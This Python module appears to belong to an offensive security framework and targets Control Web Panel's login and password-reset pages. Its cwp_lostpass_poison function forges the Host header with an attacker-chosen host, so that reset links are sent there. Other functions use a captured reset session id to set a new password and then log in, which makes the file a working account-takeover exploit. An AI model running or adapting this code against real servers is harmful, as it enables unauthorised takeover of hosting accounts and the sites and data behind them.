#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Control Web Panel (CWP) login / password-reset helpers."""

from __future__ import annotations

import html
import re
from typing import Dict, Optional, Tuple
from core.framework.base_module import BaseModule


class Control_web_panel(BaseModule):
    def cwp_post(self, path: str, data: Dict[str, str], *, host_header: str = "") -> Tuple[int, str]:
        headers = {}
        if host_header:
            headers["Host"] = host_header
        resp = self.http_request(
            method="POST",
            path=path,
            data=data,
            headers=headers or None,
            allow_redirects=False,
        )
        if not resp:
            return 0, ""
        return int(resp.status_code or 0), (resp.text or "").strip()

    def cwp_lostpass_check(self, username: str, email: str) -> bool:
        code, body = self.cwp_post(
            "/login/index.php?acc=lostpass",
            {"username": username, "email": email},
        )
        return code > 0 and body.startswith("1")

    def cwp_lostpass_poison(self, username: str, email: str, attacker_host: str) -> bool:
        code, body = self.cwp_post(
            "/login/index.php?acc=lostpass",
            {"username": username, "email": email},
            host_header=attacker_host,
        )
        return code > 0 and body.startswith("1")

    def cwp_reset_password(self, idsession: str, new_password: str) -> bool:
        path = f"/login/index.php?acc=newpass&idsession={idsession}"
        resp = self.http_request(method="GET", path=path, allow_redirects=True)
        if not resp:
            return False
        data: Dict[str, str] = {"idsession": idsession}
        post_path = "/login/index.php?acc=newpass"
        form = re.search(r"<form[^>]*>(.*?)</form>", resp.text or "", re.S | re.I)
        if form:
            block = form.group(0)
            for name, value in re.findall(
                r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"',
                block,
                re.I,
            ):
                data[name] = html.unescape(value)
            match = re.search(r'<form[^>]*action="([^"]+)"', block, re.I)
            if match:
                action = html.unescape(match.group(1))
                if action.startswith("/"):
                    post_path = action
            pw_names = re.findall(
                r'<input[^>]*type="password"[^>]*name="([^"]+)"',
                block,
                re.I,
            )
            if not pw_names:
                pw_names = ["password", "repassword"]
            for name in pw_names:
                data[name] = new_password
        else:
            data.update({"password": new_password, "repassword": new_password})
        code, body = self.cwp_post(post_path, data)
        low = body.lower()
        return any(k in low for k in ("successfully", "changed", "updated")) or code in (200, 302)

    def cwp_login(self, username: str, password: str) -> Optional[str]:
        resp = self.http_request(
            method="POST",
            path="/login/index.php?acc=login",
            data={"username": username, "password": password},
            allow_redirects=True,
        )
        if not resp:
            return None
        match = re.search(r"/cwp_[0-9a-f]+/", (resp.url or "") + (resp.text or ""))
        return match.group(0) if match else None